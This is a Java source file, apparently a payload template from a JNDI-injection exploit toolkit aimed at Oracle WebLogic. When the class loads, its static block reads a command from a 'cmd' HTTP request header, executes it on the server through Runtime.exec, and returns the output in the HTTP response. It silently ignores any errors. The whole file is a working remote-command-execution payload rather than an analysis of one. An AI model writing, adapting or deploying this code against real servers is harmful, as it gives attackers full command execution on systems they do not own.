package com.qi4l.jndi.template.weblogic;

public class weblogicEcho {

    public static String CMD_HEADER = "cmd";

    static {
        try {
            weblogic.work.WorkAdapter adapter = ((weblogic.work.ExecuteThread) Thread.currentThread()).getCurrentWork();
            if (adapter.getClass().getName().endsWith("ServletRequestImpl")) {
                String cmd = (String) adapter.getClass().getMethod("getHeader", String.class).invoke(adapter, CMD_HEADER);

                if (cmd != null && !cmd.isEmpty()) {
                    String                                        result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                    weblogic.servlet.internal.ServletResponseImpl res    = (weblogic.servlet.internal.ServletResponseImpl) adapter.getClass().getMethod("getResponse").invoke(adapter);
                    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
                    res.getServletOutputStream().flush();
                    res.getWriter().write("");
                }
            } else {
                java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
                field.setAccessible(true);
                Object obj = field.get(adapter);
                obj = obj.getClass().getMethod("getServletRequest").invoke(obj);
                String cmd = (String) obj.getClass().getMethod("getHeader", String.class).invoke(obj, "cmd");

                if (cmd != null && !cmd.isEmpty()) {
                    String                                        result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                    weblogic.servlet.internal.ServletResponseImpl res    = (weblogic.servlet.internal.ServletResponseImpl) obj.getClass().getMethod("getResponse").invoke(obj);
                    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
                    res.getServletOutputStream().flush();
                    res.getWriter().write("");
                }
            }
        } catch (Exception ignored) {
        }

    }
}
